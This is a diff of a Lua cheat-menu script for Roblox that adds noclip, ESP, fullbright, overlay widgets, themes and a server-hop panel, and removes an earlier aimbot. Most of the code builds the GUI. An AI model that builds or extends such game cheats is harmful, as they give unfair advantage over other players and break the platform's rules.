+    noclipToggleBtn.Size = UDim2.new(0, 90, 0, 28)
+    noclipToggleBtn.Position = UDim2.new(1, -100, 0.5, -14)
+    noclipToggleBtn.BackgroundColor3 = CurrentTheme.Black
+    noclipToggleBtn.Text = "NOCLIP" .. L("StatusOff")
+    noclipToggleBtn.Font = Enum.Font.GothamBold
+    noclipToggleBtn.TextSize = 10
+    noclipToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+    noclipToggleBtn.ZIndex = 6
+    Instance.new("UICorner", noclipToggleBtn).CornerRadius = UDim.new(0, 6)
+
+    local noclipBtnStroke = Instance.new("UIStroke", noclipToggleBtn)
+    noclipBtnStroke.Thickness = 1
+    noclipBtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = noclipToggleBtn, Stroke = noclipBtnStroke})
+
+    local function disableNoclipState()
+        noclipEnabled = false
+        noclipToggleBtn.Text = "NOCLIP" .. L("StatusOff")
+        noclipToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+        if noclipConnection then
+            noclipConnection:Disconnect()
+            noclipConnection = nil
+        end
+    end
+
+    local function toggleNoclip()
+        noclipEnabled = not noclipEnabled
+        if noclipEnabled then
+            noclipToggleBtn.Text = "NOCLIP" .. L("StatusOn")
+            noclipToggleBtn.TextColor3 = Color3.fromRGB(60, 225, 100)
+            if noclipConnection then noclipConnection:Disconnect() end
+            noclipConnection = RunService.Stepped:Connect(function()
+                if noclipEnabled and LocalPlayer.Character then
+                    for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
+                        if part:IsA("BasePart") and part.CanCollide == true then
+                            part.CanCollide = false
+                        end
+                    end
+                else
+                    disableNoclipState()
+                end
+            end)
+        else
+            disableNoclipState()
+            if LocalPlayer.Character then
+                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
+                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                        part.CanCollide = true
+                    end
                 end
             end
         end
     end
-    return closest
-end
 
--- Кнопка в меню (Включает саму возможность аима)
-AimbotBtn.MouseButton1Click:Connect(function()
-    aimbotEnabled = not aimbotEnabled
-    AimbotBtn.Text = "Aimbot: " .. (aimbotEnabled and "ВКЛ (Зажми X)" or "ВЫКЛ")
-    AimbotBtn.BackgroundColor3 = aimbotEnabled and Color_On or Color_Off
-end)
+    noclipToggleBtn.MouseButton1Click:Connect(toggleNoclip)
 
--- Основной цикл наведения
-RunService.RenderStepped:Connect(function()
-    
-    if aimbotEnabled and aimKeyHeld then
-        local target = getClosestPlayer()
-        if target then
-            camera.CFrame = CFrame.new(camera.CFrame.Position, target.Position)
+    LocalPlayer.CharacterAdded:Connect(function(char)
+        disableNoclipState()
+        local hum = char:WaitForChild("Humanoid", 5)
+        if hum then
+            hum.WalkSpeed = currentSpeed
         end
-    end
-	-- Внутри RunService.RenderStepped:Connect(function() ...
-if cursorUnlocked then
-    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
-    UserInputService.MouseIconEnabled = true
-    workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+    end)
 end
+
+-- ==========================================
+--        VISUAL PAGE
+-- ==========================================
+
+-- ESP Card
+do
+    local espCard = Instance.new("Frame", visualPage)
+    espCard.Name = "EspCard"
+    espCard.Size = UDim2.new(1, -8, 0, 42)
+    espCard.BackgroundColor3 = CurrentTheme.Dark
+    espCard.BorderSizePixel = 0
+    espCard.ZIndex = 4
+    Instance.new("UICorner", espCard).CornerRadius = UDim.new(0, 8)
+
+    local espCardStroke = Instance.new("UIStroke", espCard)
+    espCardStroke.Thickness = 1.5
+    espCardStroke.Color = CurrentTheme.Grey
+    espCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    local espTitle = Instance.new("TextLabel", espCard)
+    espTitle.Name = "EspTitle"
+    espTitle.Size = UDim2.new(1, -55, 1, 0)
+    espTitle.Position = UDim2.new(0, 12, 0, 0)
+    espTitle.BackgroundTransparency = 1
+    espTitle.Text = L("EspTitle")
+    espTitle.Font = Enum.Font.GothamBold
+    espTitle.TextSize = 13
+    espTitle.TextColor3 = CurrentTheme.White
+    espTitle.TextXAlignment = Enum.TextXAlignment.Left
+    espTitle.ZIndex = 5
+
+    local toggleTrack = Instance.new("Frame", espCard)
+    toggleTrack.Name = "ToggleTrack"
+    toggleTrack.Size = UDim2.new(0, 36, 0, 20)
+    toggleTrack.Position = UDim2.new(1, -46, 0.5, -10)
+    toggleTrack.BackgroundColor3 = Color3.fromRGB(45, 45, 52)
+    toggleTrack.BorderSizePixel = 0
+    toggleTrack.ZIndex = 5
+    Instance.new("UICorner", toggleTrack).CornerRadius = UDim.new(1, 0)
+
+    local toggleDot = Instance.new("Frame", toggleTrack)
+    toggleDot.Name = "ToggleDot"
+    toggleDot.Size = UDim2.new(0, 14, 0, 14)
+    toggleDot.Position = UDim2.new(0, 3, 0.5, -7)
+    toggleDot.BackgroundColor3 = Color3.fromRGB(180, 180, 190)
+    toggleDot.BorderSizePixel = 0
+    toggleDot.ZIndex = 6
+    Instance.new("UICorner", toggleDot).CornerRadius = UDim.new(1, 0)
+
+    local espClickBtn = Instance.new("TextButton", espCard)
+    espClickBtn.Size = UDim2.new(1, 0, 1, 0)
+    espClickBtn.BackgroundTransparency = 1
+    espClickBtn.Text = ""
+    espClickBtn.ZIndex = 7
+
+    table.insert(registeredButtons, {Button = espCard, Stroke = espCardStroke})
+
+    espClickBtn.MouseButton1Click:Connect(function()
+        local state = toggleESP()
+        if state then
+            tween(toggleTrack, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(46, 204, 113)})
+            tween(toggleDot, TweenInfo.new(0.2), {Position = UDim2.new(1, -17, 0.5, -7), BackgroundColor3 = Color3.fromRGB(255, 255, 255)})
+            tween(espCardStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(46, 204, 113)})
+        else
+            tween(toggleTrack, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 52)})
+            tween(toggleDot, TweenInfo.new(0.2), {Position = UDim2.new(0, 3, 0.5, -7), BackgroundColor3 = Color3.fromRGB(180, 180, 190)})
+            tween(espCardStroke, TweenInfo.new(0.2), {Color = CurrentTheme.Grey})
+        end
+    end)
+end
+
+-- СИСТЕМА СВЕТА В ВИЗУАЛАХ
+local isLightEnabled = false
+local isGlobalFullbright = false
+local lightBrightness = 5
+local lightRange = 60
+
+local function getOrCreateLight()
+    local char = LocalPlayer.Character
+    if not char then return nil end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return nil end
+    
+    local light = hrp:FindFirstChild("JezPointLight")
+    if not light then
+        light = Instance.new("PointLight")
+        light.Name = "JezPointLight"
+        light.Shadows = false
+        light.Parent = hrp
+    end
+    return light
+end
+
+local function updatePointLight()
+    local light = getOrCreateLight()
+    if light then
+        light.Enabled = isLightEnabled
+        light.Brightness = lightBrightness
+        light.Range = lightRange
+    end
+end
+
+local defaultLighting = {
+    Ambient = Lighting.Ambient,
+    OutdoorAmbient = Lighting.OutdoorAmbient,
+    Brightness = Lighting.Brightness,
+    GlobalShadows = Lighting.GlobalShadows,
+    FogEnd = Lighting.FogEnd
+}
+
+local function applyGlobalFullbright(state)
+    if state then
+        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
+        Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
+        Lighting.Brightness = 2
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 100000
+    else
+        Lighting.Ambient = defaultLighting.Ambient
+        Lighting.OutdoorAmbient = defaultLighting.OutdoorAmbient
+        Lighting.Brightness = defaultLighting.Brightness
+        Lighting.GlobalShadows = defaultLighting.GlobalShadows
+        Lighting.FogEnd = defaultLighting.FogEnd
+    end
+end
+
+LocalPlayer.CharacterAdded:Connect(function(char)
+    char:WaitForChild("HumanoidRootPart")
+    task.wait(0.2)
+    if isLightEnabled then
+        updatePointLight()
+    end
 end)
 
+-- Карточка Ауры Света
+do
+    local lightCard = Instance.new("Frame", visualPage)
+    lightCard.Name = "LightCard"
+    lightCard.Size = UDim2.new(1, -8, 0, 95)
+    lightCard.BackgroundColor3 = CurrentTheme.Dark
+    lightCard.BorderSizePixel = 0
+    lightCard.ZIndex = 4
+    Instance.new("UICorner", lightCard).CornerRadius = UDim.new(0, 10)
 
-print("Jez Menu: Аимбот на X настроен!")
-print("Jez Menu: Скрипт успешно запущен без ошибок!")
+    local lightCardStroke = Instance.new("UIStroke", lightCard)
+    lightCardStroke.Thickness = 1.5
+    lightCardStroke.Color = CurrentTheme.Grey
+    lightCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = lightCard, Stroke = lightCardStroke})
 
+    local lightTitleLabel = Instance.new("TextLabel", lightCard)
+    lightTitleLabel.Name = "LightTitleLabel"
+    lightTitleLabel.Size = UDim2.new(1, -110, 0, 25)
+    lightTitleLabel.Position = UDim2.new(0, 12, 0, 8)
+    lightTitleLabel.BackgroundTransparency = 1
+    lightTitleLabel.Text = L("LightTitle")
+    lightTitleLabel.Font = Enum.Font.GothamBold
+    lightTitleLabel.TextSize = 13
+    lightTitleLabel.TextColor3 = CurrentTheme.White
+    lightTitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    lightTitleLabel.ZIndex = 5
+
+    local lightToggleBtn = Instance.new("TextButton", lightCard)
+    lightToggleBtn.Name = "LightToggleBtn"
+    lightToggleBtn.Size = UDim2.new(0, 85, 0, 26)
+    lightToggleBtn.Position = UDim2.new(1, -97, 0, 8)
+    lightToggleBtn.BackgroundColor3 = CurrentTheme.Black
+    lightToggleBtn.BorderSizePixel = 0
+    lightToggleBtn.Text = "LIGHT" .. (isLightEnabled and L("StatusOn") or L("StatusOff"))
+    lightToggleBtn.Font = Enum.Font.GothamBold
+    lightToggleBtn.TextSize = 10
+    lightToggleBtn.TextColor3 = isLightEnabled and Color3.fromRGB(60, 225, 100) or Color3.fromRGB(225, 60, 60)
+    lightToggleBtn.ZIndex = 6
+    Instance.new("UICorner", lightToggleBtn).CornerRadius = UDim.new(0, 6)
+
+    local lightToggleStroke = Instance.new("UIStroke", lightToggleBtn)
+    lightToggleStroke.Thickness = 1
+    lightToggleStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = lightToggleBtn, Stroke = lightToggleStroke})
+
+    lightToggleBtn.MouseButton1Click:Connect(function()
+        isLightEnabled = not isLightEnabled
+        updatePointLight()
+        lightToggleBtn.Text = "LIGHT" .. (isLightEnabled and L("StatusOn") or L("StatusOff"))
+        lightToggleBtn.TextColor3 = isLightEnabled and Color3.fromRGB(60, 225, 100) or Color3.fromRGB(225, 60, 60)
+    end)
+
+    local lightBrightnessLabel = Instance.new("TextLabel", lightCard)
+    lightBrightnessLabel.Name = "LightBrightnessLabel"
+    lightBrightnessLabel.Size = UDim2.new(0, 75, 0, 24)
+    lightBrightnessLabel.Position = UDim2.new(0, 12, 0, 38)
+    lightBrightnessLabel.BackgroundTransparency = 1
+    lightBrightnessLabel.Text = L("LightBrightnessLabel")
+    lightBrightnessLabel.Font = Enum.Font.GothamMedium
+    lightBrightnessLabel.TextSize = 11
+    lightBrightnessLabel.TextColor3 = CurrentTheme.Light
+    lightBrightnessLabel.TextXAlignment = Enum.TextXAlignment.Left
+    lightBrightnessLabel.ZIndex = 5
+
+    local brightnessInput = Instance.new("TextBox", lightCard)
+    brightnessInput.Name = "BrightnessInput"
+    brightnessInput.Size = UDim2.new(0, 45, 0, 22)
+    brightnessInput.Position = UDim2.new(0, 90, 0, 39)
+    brightnessInput.BackgroundColor3 = CurrentTheme.Black
+    brightnessInput.Text = tostring(lightBrightness)
+    brightnessInput.Font = Enum.Font.GothamBold
+    brightnessInput.TextSize = 11
+    brightnessInput.TextColor3 = CurrentTheme.White
+    brightnessInput.BorderSizePixel = 0
+    brightnessInput.ClearTextOnFocus = false
+    brightnessInput.ZIndex = 6
+    Instance.new("UICorner", brightnessInput).CornerRadius = UDim.new(0, 6)
+
+    local brightStroke = Instance.new("UIStroke", brightnessInput)
+    brightStroke.Thickness = 1
+    brightStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = brightnessInput, Stroke = brightStroke})
+
+    brightnessInput.FocusLost:Connect(function()
+        local cleanText = brightnessInput.Text:gsub(",", ".")
+        local num = tonumber(cleanText)
+        if num then
+            lightBrightness = math.clamp(num, 0.1, 100)
+        end
+        brightnessInput.Text = tostring(lightBrightness)
+        if isLightEnabled then updatePointLight() end
+    end)
+
+    local lightRangeLabel = Instance.new("TextLabel", lightCard)
+    lightRangeLabel.Name = "LightRangeLabel"
+    lightRangeLabel.Size = UDim2.new(0, 65, 0, 24)
+    lightRangeLabel.Position = UDim2.new(0, 145, 0, 38)
+    lightRangeLabel.BackgroundTransparency = 1
+    lightRangeLabel.Text = L("LightRangeLabel")
+    lightRangeLabel.Font = Enum.Font.GothamMedium
+    lightRangeLabel.TextSize = 11
+    lightRangeLabel.TextColor3 = CurrentTheme.Light
+    lightRangeLabel.TextXAlignment = Enum.TextXAlignment.Left
+    lightRangeLabel.ZIndex = 5
+
+    local rangeInput = Instance.new("TextBox", lightCard)
+    rangeInput.Name = "RangeInput"
+    rangeInput.Size = UDim2.new(0, 45, 0, 22)
+    rangeInput.Position = UDim2.new(0, 212, 0, 39)
+    rangeInput.BackgroundColor3 = CurrentTheme.Black
+    rangeInput.Text = tostring(lightRange)
+    rangeInput.Font = Enum.Font.GothamBold
+    rangeInput.TextSize = 11
+    rangeInput.TextColor3 = CurrentTheme.White
+    rangeInput.BorderSizePixel = 0
+    rangeInput.ClearTextOnFocus = false
+    rangeInput.ZIndex = 6
+    Instance.new("UICorner", rangeInput).CornerRadius = UDim.new(0, 6)
+
+    local rangeStroke = Instance.new("UIStroke", rangeInput)
+    rangeStroke.Thickness = 1
+    rangeStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = rangeInput, Stroke = rangeStroke})
+
+    rangeInput.FocusLost:Connect(function()
+        local cleanText = rangeInput.Text:gsub(",", ".")
+        local num = tonumber(cleanText)
+        if num then
+            lightRange = math.clamp(num, 1, 1000)
+        end
+        rangeInput.Text = tostring(lightRange)
+        if isLightEnabled then updatePointLight() end
+    end)
+end
+
+-- Карточка Глобального Fullbright
+do
+    local globalCard = Instance.new("Frame", visualPage)
+    globalCard.Name = "GlobalFullbrightCard"
+    globalCard.Size = UDim2.new(1, -8, 0, 45)
+    globalCard.BackgroundColor3 = CurrentTheme.Dark
+    globalCard.BorderSizePixel = 0
+    globalCard.ZIndex = 4
+    Instance.new("UICorner", globalCard).CornerRadius = UDim.new(0, 10)
+
+    local globalCardStroke = Instance.new("UIStroke", globalCard)
+    globalCardStroke.Thickness = 1.5
+    globalCardStroke.Color = CurrentTheme.Grey
+    globalCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = globalCard, Stroke = globalCardStroke})
+
+    local globalFullbrightTitleLabel = Instance.new("TextLabel", globalCard)
+    globalFullbrightTitleLabel.Name = "GlobalFullbrightTitleLabel"
+    globalFullbrightTitleLabel.Size = UDim2.new(1, -110, 0, 45)
+    globalFullbrightTitleLabel.Position = UDim2.new(0, 12, 0, 0)
+    globalFullbrightTitleLabel.BackgroundTransparency = 1
+    globalFullbrightTitleLabel.Text = L("GlobalFullbrightTitle")
+    globalFullbrightTitleLabel.Font = Enum.Font.GothamBold
+    globalFullbrightTitleLabel.TextSize = 13
+    globalFullbrightTitleLabel.TextColor3 = CurrentTheme.White
+    globalFullbrightTitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    globalFullbrightTitleLabel.ZIndex = 5
+
+    local globalFullbrightToggleBtn = Instance.new("TextButton", globalCard)
+    globalFullbrightToggleBtn.Name = "GlobalFullbrightToggleBtn"
+    globalFullbrightToggleBtn.Size = UDim2.new(0, 85, 0, 28)
+    globalFullbrightToggleBtn.Position = UDim2.new(1, -97, 0, 8.5)
+    globalFullbrightToggleBtn.BackgroundColor3 = CurrentTheme.Black
+    globalFullbrightToggleBtn.BorderSizePixel = 0
+    globalFullbrightToggleBtn.Text = "WORLD" .. (isGlobalFullbright and L("StatusOn") or L("StatusOff"))
+    globalFullbrightToggleBtn.Font = Enum.Font.GothamBold
+    globalFullbrightToggleBtn.TextSize = 10
+    globalFullbrightToggleBtn.TextColor3 = isGlobalFullbright and Color3.fromRGB(60, 225, 100) or Color3.fromRGB(225, 60, 60)
+    globalFullbrightToggleBtn.ZIndex = 6
+    Instance.new("UICorner", globalFullbrightToggleBtn).CornerRadius = UDim.new(0, 6)
+
+    local globalToggleStroke = Instance.new("UIStroke", globalFullbrightToggleBtn)
+    globalToggleStroke.Thickness = 1
+    globalToggleStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = globalFullbrightToggleBtn, Stroke = globalToggleStroke})
+
+    globalFullbrightToggleBtn.MouseButton1Click:Connect(function()
+        isGlobalFullbright = not isGlobalFullbright
+        applyGlobalFullbright(isGlobalFullbright)
+        globalFullbrightToggleBtn.Text = "WORLD" .. (isGlobalFullbright and L("StatusOn") or L("StatusOff"))
+        globalFullbrightToggleBtn.TextColor3 = isGlobalFullbright and Color3.fromRGB(60, 225, 100) or Color3.fromRGB(225, 60, 60)
+    end)
+end
+
+-- Clock Widget Row
+task.spawn(function()
+    local clockRowFrame = Instance.new("Frame", visualPage)
+    clockRowFrame.Size = UDim2.new(1, -8, 0, 38)
+    clockRowFrame.BackgroundTransparency = 1
+    clockRowFrame.ZIndex = 4
+
+    local clockRowBtn = Instance.new("TextButton", clockRowFrame)
+    clockRowBtn.Name = "ClockRowBtn"
+    clockRowBtn.Size = UDim2.new(1, -45, 1, 0)
+    clockRowBtn.BackgroundColor3 = CurrentTheme.Dark
+    clockRowBtn.BorderSizePixel = 0
+    clockRowBtn.Text = L("ClockTitle")
+    clockRowBtn.Font = Enum.Font.GothamMedium
+    clockRowBtn.TextSize = 13
+    clockRowBtn.TextColor3 = CurrentTheme.White
+    clockRowBtn.ZIndex = 4
+    Instance.new("UICorner", clockRowBtn).CornerRadius = UDim.new(0, 8)
+
+    local clockRowStroke = Instance.new("UIStroke", clockRowBtn)
+    clockRowStroke.Thickness = 1.5
+    clockRowStroke.Color = CurrentTheme.Grey
+    clockRowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = clockRowBtn, Stroke = clockRowStroke})
+
+    local MasterLock = Instance.new("TextButton", clockRowFrame)
+    MasterLock.Size = UDim2.new(0, 38, 1, 0)
+    MasterLock.Position = UDim2.new(1, -38, 0, 0)
+    MasterLock.BackgroundColor3 = CurrentTheme.Dark
+    MasterLock.BorderSizePixel = 0
+    MasterLock.Text = "🔓"
+    MasterLock.TextSize = 16
+    MasterLock.ZIndex = 4
+    Instance.new("UICorner", MasterLock).CornerRadius = UDim.new(0, 8)
+
+    local MasterLockStroke = Instance.new("UIStroke", MasterLock)
+    MasterLockStroke.Thickness = 1.5
+    MasterLockStroke.Color = CurrentTheme.Grey
+    MasterLockStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = MasterLock, Stroke = MasterLockStroke})
+
+    MasterLock.MouseButton1Click:Connect(function()
+        isClockLocked = not isClockLocked
+        MasterLock.Text = isClockLocked and "🔒" or "🔓"
+    end)
+
+    clockRowBtn.MouseButton1Click:Connect(function()
+        clockEnabled = not clockEnabled
+        ClockFrame.Visible = clockEnabled
+    end)
+end)
+
+-- FPS-PING Row
+task.spawn(function()
+    local statsRow = Instance.new("Frame")
+    statsRow.Name = "StatsRow"
+    statsRow.Parent = visualPage
+    statsRow.Size = UDim2.new(1, -8, 0, 38)
+    statsRow.BackgroundTransparency = 1
+    statsRow.ZIndex = 4
+
+    local statsTitle = Instance.new("TextButton")
+    statsTitle.Name = "StatsBtn"
+    statsTitle.Parent = statsRow
+    statsTitle.Size = UDim2.new(1, -45, 1, 0)
+    statsTitle.BackgroundColor3 = CurrentTheme.Dark
+    statsTitle.BorderSizePixel = 0
+    statsTitle.Text = L("StatsTitle")
+    statsTitle.Font = Enum.Font.GothamMedium
+    statsTitle.TextSize = 13
+    statsTitle.TextColor3 = CurrentTheme.White
+    statsTitle.ZIndex = 4
+    Instance.new("UICorner", statsTitle).CornerRadius = UDim.new(0, 8)
+
+    local stroke1 = Instance.new("UIStroke", statsTitle)
+    stroke1.Thickness = 1.5
+    stroke1.Color = CurrentTheme.Grey
+    stroke1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = statsTitle, Stroke = stroke1})
+
+    local lockBtn = Instance.new("TextButton")
+    lockBtn.Name = "StatsLockBtn"
+    lockBtn.Parent = statsRow
+    lockBtn.Size = UDim2.new(0, 38, 1, 0)
+    lockBtn.Position = UDim2.new(1, -38, 0, 0)
+    lockBtn.BackgroundColor3 = CurrentTheme.Dark
+    lockBtn.BorderSizePixel = 0
+    lockBtn.Text = "🔒"
+    lockBtn.TextSize = 16
+    lockBtn.ZIndex = 4
+    Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 8)
+
+    local stroke2 = Instance.new("UIStroke", lockBtn)
+    stroke2.Thickness = 1.5
+    stroke2.Color = CurrentTheme.Grey
+    stroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = lockBtn, Stroke = stroke2})
+
+    local Stats = game:GetService("Stats")
+
+    local statsEnabled = false
+    local isLocked = true
+
+    local statsGui = Instance.new("ScreenGui")
+    statsGui.Name = "StatsWidgetGui"
+    statsGui.ResetOnSpawn = false
+    statsGui.Parent = game:GetService("CoreGui")
+
+    local statsFrame = Instance.new("Frame", statsGui)
+    statsFrame.Name = "StatsFrame"
+    statsFrame.Size = UDim2.new(0, 160, 0, 36)
+    statsFrame.Position = UDim2.new(0.02, 0, 0.2, 0)
+    statsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    statsFrame.BackgroundTransparency = 0.2
+    statsFrame.Visible = false
+    statsFrame.Active = true
+    Instance.new("UICorner", statsFrame).CornerRadius = UDim.new(0, 6)
+
+    makeDraggable(statsFrame, true)
+
+    local statsLabel = Instance.new("TextLabel", statsFrame)
+    statsLabel.Size = UDim2.new(1, 0, 1, 0)
+    statsLabel.BackgroundTransparency = 1
+    statsLabel.Font = Enum.Font.GothamBold
+    statsLabel.TextSize = 12
+    statsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    statsLabel.Text = "FPS: 60 | Ping: 0 ms"
+
+    local frameCount = 0
+    local lastTime = os.clock()
+
+    RunService.RenderStepped:Connect(function()
+        if not statsEnabled then return end
+        
+        frameCount = frameCount + 1
+        local currentTime = os.clock()
+        
+        if currentTime - lastTime >= 1 then
+            local currentFPS = frameCount
+            frameCount = 0
+            lastTime = currentTime
+            
+            local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+            statsLabel.Text = string.format("FPS: %d | Ping: %d ms", currentFPS, ping)
+        end
+    end)
+
+    statsTitle.MouseButton1Click:Connect(function()
+        statsEnabled = not statsEnabled
+        statsFrame.Visible = statsEnabled
+    end)
+
+    lockBtn.MouseButton1Click:Connect(function()
+        isLocked = not isLocked
+        lockBtn.Text = isLocked and "🔒" or "🔓"
+    end)
+end)
+
+-- КЛАВИШИ (KEYSTROKES WASD + SPACE)
+task.spawn(function()
+    local keyRowFrame = Instance.new("Frame", visualPage)
+    keyRowFrame.Name = "KeyRowFrame"
+    keyRowFrame.Size = UDim2.new(1, -8, 0, 38)
+    keyRowFrame.BackgroundTransparency = 1
+    keyRowFrame.ZIndex = 4
+
+    local keyRowBtn = Instance.new("TextButton", keyRowFrame)
+    keyRowBtn.Name = "KeyRowBtn"
+    keyRowBtn.Size = UDim2.new(1, -45, 1, 0)
+    keyRowBtn.BackgroundColor3 = CurrentTheme.Dark
+    keyRowBtn.BorderSizePixel = 0
+    keyRowBtn.Text = L("KeyTitle")
+    keyRowBtn.Font = Enum.Font.GothamMedium
+    keyRowBtn.TextSize = 13
+    keyRowBtn.TextColor3 = CurrentTheme.White
+    keyRowBtn.ZIndex = 4
+    Instance.new("UICorner", keyRowBtn).CornerRadius = UDim.new(0, 8)
+
+    local stroke1 = Instance.new("UIStroke", keyRowBtn)
+    stroke1.Thickness = 1.5
+    stroke1.Color = CurrentTheme.Grey
+    stroke1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = keyRowBtn, Stroke = stroke1})
+
+    local KeyLockBtn = Instance.new("TextButton", keyRowFrame)
+    KeyLockBtn.Name = "KeyLockBtn"
+    KeyLockBtn.Size = UDim2.new(0, 38, 1, 0)
+    KeyLockBtn.Position = UDim2.new(1, -38, 0, 0)
+    KeyLockBtn.BackgroundColor3 = CurrentTheme.Dark
+    KeyLockBtn.BorderSizePixel = 0
+    KeyLockBtn.Text = "🔓"
+    KeyLockBtn.TextSize = 16
+    KeyLockBtn.ZIndex = 4
+    Instance.new("UICorner", KeyLockBtn).CornerRadius = UDim.new(0, 8)
+
+    local stroke2 = Instance.new("UIStroke", KeyLockBtn)
+    stroke2.Thickness = 1.5
+    stroke2.Color = CurrentTheme.Grey
+    stroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = KeyLockBtn, Stroke = stroke2})
+
+    KeyLockBtn.MouseButton1Click:Connect(function()
+        isKeystrokesLocked = not isKeystrokesLocked
+        KeyLockBtn.Text = isKeystrokesLocked and "🔒" or "🔓"
+    end)
+
+    keyRowBtn.MouseButton1Click:Connect(function()
+        keystrokesEnabled = not keystrokesEnabled
+        if KeysFrame then
+            KeysFrame.Visible = keystrokesEnabled
+        end
+    end)
+end)
+
+-- ==========================================
+--        THEMES PAGE
+-- ==========================================
+
+addStyledButton(themesPage, "🌈 Dynamic Rainbow (RGB)", function()
+    startRainbowTheme()
+end)
+
+addStyledButton(themesPage, "⬛ Default Dark", function()
+    applyTheme(Themes.Default)
+end)
+
+addStyledButton(themesPage, "🟣 Purple Neon", function()
+    applyTheme(Themes.Purple)
+end)
+
+addStyledButton(themesPage, "🔵 Cyber Blue", function()
+    applyTheme(Themes.CyberBlue)
+end)
+
+addStyledButton(themesPage, "🔴 Crimson Red", function()
+    applyTheme(Themes.CrimsonRed)
+end)
+
+addStyledButton(themesPage, "🟢 Emerald Green", function()
+    applyTheme(Themes.EmeraldGreen)
+end)
+
+addStyledButton(themesPage, "🟠 Sunset Orange", function()
+    applyTheme(Themes.SunsetOrange)
+end)
+
+addStyledButton(themesPage, "🌸 Rose Pink", function()
+    applyTheme(Themes.RosePink)
+end)
+
+addStyledButton(themesPage, "🟡 Midnight Gold", function()
+    applyTheme(Themes.MidnightGold)
+end)
+
+addStyledButton(themesPage, "🧪 Toxic Lime", function()
+    applyTheme(Themes.ToxicLime)
+end)
+
+local resetThemeBtn = addStyledButton(themesPage, L("ResetTheme"), function()
+    applyTheme(Themes.Default)
+end)
+resetThemeBtn.Name = "ResetThemeBtn"
+
+-- ==========================================
+--        SETTINGS PAGE
+-- ==========================================
 
 task.spawn(function()
-    while true do
-        TimeLabel.Text = os.date("%X")
-        task.wait(1)
+    local serverHopCard = Instance.new("Frame", settingsPage)
+    serverHopCard.Name = "ServerHopCard"
+    serverHopCard.Size = UDim2.new(1, -8, 0, 50)
+    serverHopCard.BackgroundColor3 = CurrentTheme.Dark
+    serverHopCard.BorderSizePixel = 0
+    serverHopCard.ZIndex = 4
+    Instance.new("UICorner", serverHopCard).CornerRadius = UDim.new(0, 10)
+
+    local serverHopStroke = Instance.new("UIStroke", serverHopCard)
+    serverHopStroke.Thickness = 1.5
+    serverHopStroke.Color = CurrentTheme.Grey
+    serverHopStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = serverHopCard, Stroke = serverHopStroke})
+
+    local serverHopTitle = Instance.new("TextLabel", serverHopCard)
+    serverHopTitle.Name = "ServerHopTitle"
+    serverHopTitle.Size = UDim2.new(1, -170, 0, 50)
+    serverHopTitle.Position = UDim2.new(0, 12, 0, 0)
+    serverHopTitle.BackgroundTransparency = 1
+    serverHopTitle.Text = L("ServerHopTitle")
+    serverHopTitle.Font = Enum.Font.GothamBold
+    serverHopTitle.TextSize = 12
+    serverHopTitle.TextColor3 = CurrentTheme.White
+    serverHopTitle.TextXAlignment = Enum.TextXAlignment.Left
+    serverHopTitle.ZIndex = 5
+
+    local playerBox = Instance.new("TextBox", serverHopCard)
+    playerBox.Size = UDim2.new(0, 40, 0, 28)
+    playerBox.Position = UDim2.new(1, -145, 0, 11)
+    playerBox.BackgroundColor3 = CurrentTheme.Black
+    playerBox.BorderSizePixel = 0
+    playerBox.Text = "2"
+    playerBox.Font = Enum.Font.GothamBold
+    playerBox.TextSize = 12
+    playerBox.TextColor3 = CurrentTheme.White
+    playerBox.ZIndex = 6
+    Instance.new("UICorner", playerBox).CornerRadius = UDim.new(0, 6)
+
+    local playerBoxStroke = Instance.new("UIStroke", playerBox)
+    playerBoxStroke.Thickness = 1
+    playerBoxStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = playerBox, Stroke = playerBoxStroke})
+
+    local findServerBtn = Instance.new("TextButton", serverHopCard)
+    findServerBtn.Name = "FindServerBtn"
+    findServerBtn.Size = UDim2.new(0, 90, 0, 28)
+    findServerBtn.Position = UDim2.new(1, -98, 0, 11)
+    findServerBtn.BackgroundColor3 = CurrentTheme.Black
+    findServerBtn.BorderSizePixel = 0
+    findServerBtn.Text = L("FindBtn")
+    findServerBtn.Font = Enum.Font.GothamBold
+    findServerBtn.TextSize = 10
